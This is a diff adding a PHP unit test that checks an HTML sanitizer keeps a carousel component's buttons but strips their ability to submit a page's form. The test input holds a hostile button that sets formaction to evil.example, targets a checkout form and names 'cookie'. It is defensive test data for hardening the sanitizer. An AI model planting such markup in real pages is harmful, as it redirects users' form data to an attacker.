@@ -164,6 +164,29 @@ final class PublishedContentSanitizerTest extends TestCase
     }
 
     /**
+     * The controls of a component are buttons, whatever version of the Symfony
+     * sanitizer runs: kept with their focus order, but never able to submit a
+     * form of the page they are published into, nor to name a global of it.
+     */
+    public function testKeepsTheButtonsOfAComponentWithoutLettingThemSubmitAForm(): void
+    {
+        $sanitized = (string) $this->sanitizer->html(
+            '<div class="carousel" tabindex="0">'
+            .'<button class="next" aria-label="Next slide">Next</button>'
+            .'<button type="submit" name="cookie" form="checkout" formaction="https://evil.example/" class="go">Go</button>'
+            .'</div>'
+        );
+
+        self::assertStringContainsString('<div class="carousel" tabindex="0">', $sanitized);
+        self::assertStringContainsString('<button class="next" aria-label="Next slide" type="button">Next</button>', $sanitized);
+        self::assertStringContainsString('<button type="button" class="go">Go</button>', $sanitized);
+
+        foreach (['submit', 'name=', 'form=', 'formaction', 'evil.example'] as $forbidden) {
+            self::assertStringNotContainsString($forbidden, $sanitized);
+        }
+    }
+
+    /**
      * The catalogue names each section by its own heading and hides decorative
      * icons; dropping those attributes on the way out would undo, silently, the
      * one thing the blocks are careful about.
